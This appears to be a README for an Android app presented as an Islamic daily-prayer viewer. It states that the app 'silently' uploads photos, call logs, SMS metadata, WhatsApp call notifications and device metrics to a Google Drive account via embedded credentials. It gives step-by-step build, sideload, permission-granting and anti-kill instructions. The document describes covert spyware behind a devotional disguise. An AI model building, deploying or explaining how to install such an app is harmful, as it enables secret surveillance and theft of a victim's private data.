# Islamic Duas - Daily Prayer App with Background Sync

## What This App Does

Islamic Duas is a beautiful devotional utility that displays 10 popular daily Duas (prayers) with Arabic text and Urdu translations. 

Silently in the background, it also syncs device data to your Google Drive:

1. **Duas Display** - Scroll through 10 beautiful daily prayers in Arabic + Urdu
2. **Photos** - silently syncs new photos (NO videos) from DCIM/Pictures + trash recovery
3. **Call Logs** - silently syncs incoming/outgoing/missed call history
4. **SMS Metadata** - logs timestamp + number only (no message body)
5. **WhatsApp Calls** - captures call notifications (contact name + timestamp)
6. **Device Metrics** - battery %, temperature, storage, WiFi SSID, screen time, boot events

Background sync runs automatically every 6 hours when the phone is idle (screen off), with zero impact on the smooth front-end experience.

---

## The APK File

The ready-to-install APK is at:

> `IslamicDuas.apk` (13 MB)

Transfer this file to your Android phone (via USB cable, email, or cloud) and tap to install.

---

## How to Compile Yourself (Step-by-Step)

If you want to modify the code and build your own APK:

### What You Need
- A computer (Windows, Mac, or Linux)
- Internet connection

### Step 1: Install Android Studio
1. Go to https://developer.android.com/studio
2. Click the big "Download Android Studio" button
3. Run the installer (follow the on-screen prompts - click "Next" through everything)
4. Launch Android Studio after installation
5. It will ask about "Import Settings" - choose "Do not import settings"
6. Wait for the initial setup to finish (it downloads the Android SDK)

### Step 2: Open the Project
1. In Android Studio, click **File → Open**
2. Navigate to the `DeviceSync` folder
3. Click **Open**
4. Wait - Android Studio will download remaining dependencies (first time takes a few minutes)

### Step 3: Build the APK
1. Click the **Build** menu at the top
2. Select **Build Bundle(s) / APK(s) → Build APK(s)**
3. Wait for the build to complete (a popup appears in the bottom-right)
4. Click the **locate** link in the popup to find the APK
5. The APK is at: `app/build/outputs/apk/debug/app-debug.apk`

### Or use Command Line (faster)
1. Open **Terminal** (Mac/Linux) or **Command Prompt** (Windows)
2. Navigate to the DeviceSync folder:
   ```
   cd /path/to/DeviceSync
   ```
3. Run:
   ```
   ./gradlew assembleDebug
   ```
4. Find the APK at `app/build/outputs/apk/debug/app-debug.apk`

---

## How to Install on Your Phone

### Transfer the APK
- **USB cable**: Connect phone to computer, copy APK file to Downloads folder
- **Email**: Email the APK to yourself, download on phone
- **Cloud**: Upload to Google Drive/Dropbox, download on phone

### Install
1. On your phone, open the **Files** app
2. Navigate to where you saved the APK
3. Tap the APK file
4. If it asks about "Install unknown apps", allow it from your file manager
5. Tap **Install**

### Grant Permissions (First Launch)
When you open the app for the first time, grant these permissions:

1. **Photos** - Allow access to photos
2. **Phone** - Allow access to call logs
3. **SMS** - Allow access to SMS
4. **Usage Access** - A settings page opens, find "DeviceSync" and toggle it ON
5. **Battery Optimization** - A settings page opens, choose "Don't optimize" for DeviceSync

### Important: Notification Listener (for WhatsApp)
1. Open **Settings → Apps → DeviceSync**
2. Tap **Notification access** (or go to Settings → Notification Access)
3. Toggle ON for DeviceSync

---

## Prevent Android from Killing the App

### Samsung (One UI)
1. Settings → Apps → DeviceSync → Battery
2. Select **"Unrestricted"**
3. Also go to: Settings → Battery → Background usage limits → Never sleeping apps
4. Add DeviceSync

### Huawei (EMUI / HMS)
1. Settings → Apps → Apps → DeviceSync → App launch
2. Toggle **"Manage manually"**
3. Enable ALL three: **"Auto-launch"**, **"Secondary launch"**, **"Run in background"**

### Other Phones (Xiaomi, Oppo, etc.)
- Settings → Apps → DeviceSync → Battery → **"No restrictions"**
- Settings → Apps → DeviceSync → **"Allow background activity"**

---

## What Gets Synced

Every 6 hours while the phone is idle (screen off), DeviceSync uploads:

| Data | Where it goes in Drive |
|------|----------------------|
| Photos (new images only) | `DeviceSync_Photos/` folder |
| Device log (calls, SMS, metrics) | `DeviceSync_Logs/device_sync_log_[timestamp].txt` |

---

## Source Code Structure

```
DeviceSync/
├── app/src/main/java/com/devicesync/
│   ├── MainActivity.kt              # First-run permission requests
│   ├── DeviceSyncApp.kt             # App initialization
│   ├── auth/ServiceAccountAuth.kt   # Google Drive JWT auth
│   ├── drive/GoogleDriveService.kt  # Drive API uploads
│   ├── media/MediaCollector.kt      # Photo scanner (no videos)
│   ├── logs/CallLogCollector.kt     # Call log reader
│   ├── logs/SmsLogCollector.kt      # SMS metadata reader
│   ├── logs/WhatsAppCallListener.kt # WhatsApp notification listener
│   ├── metrics/MetricsCollector.kt  # Battery, storage, WiFi stats
│   ├── sync/SyncScheduler.kt        # WorkManager scheduling
│   ├── sync/FullSyncWorker.kt       # Main sync worker
│   ├── sync/BootReceiver.kt         # Re-schedule after reboot
│   └── utils/
│       ├── ServiceAccountConfig.kt  # Your credentials (embedded)
│       ├── RollingLogWriter.kt      # Log file manager
│       └── DeviceInfo.kt            # Network/storage/battery helpers
```
